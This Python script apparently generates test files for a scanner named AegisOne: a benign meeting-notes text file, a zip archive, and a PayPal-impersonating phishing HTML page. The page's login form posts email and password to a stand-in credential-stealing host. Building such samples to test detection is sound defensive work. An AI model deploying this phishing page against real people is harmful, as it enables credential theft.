import os
import zipfile

def create_test_files():
    print("🛠️ Generating Test Files for AegisOne...")
    
    # 1. Phishing HTML File (Forms + Malicious Link)
    html_content = """
    <html>
    <body>
        <h2>URGENT: Verify Your PayPal Account</h2>
        <p>Your account is restricted. Please login below:</p>
        <form action="http://secure-login-paypal-verify.tk/steal_creds" method="POST">
            Email: <input type="text" name="email"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Verify Now">
        </form>
    </body>
    </html>
    """
    with open("test_phishing.html", "w") as f:
        f.write(html_content)
    print("✅ Created test_phishing.html")

    # 2. Safe Text File
    txt_content = """
    Meeting Notes - Q3 Planning
    ---------------------------
    - Discussed new marketing budget.
    - Please review the attached PDF before Monday.
    - Visit our official site at https://www.google.com for the template.
    """
    with open("test_safe.txt", "w") as f:
        f.write(txt_content)
    print("✅ Created test_safe.txt")

    # 3. Malicious ZIP File (Contains the phishing HTML)
    with zipfile.ZipFile("test_malicious.zip", "w") as z:
        z.write("test_phishing.html")
    print("✅ Created test_malicious.zip (Contains HTML payload)")
    
    print("\n🎉 All test files generated in the AIML folder!")

if __name__ == "__main__":
    create_test_files()
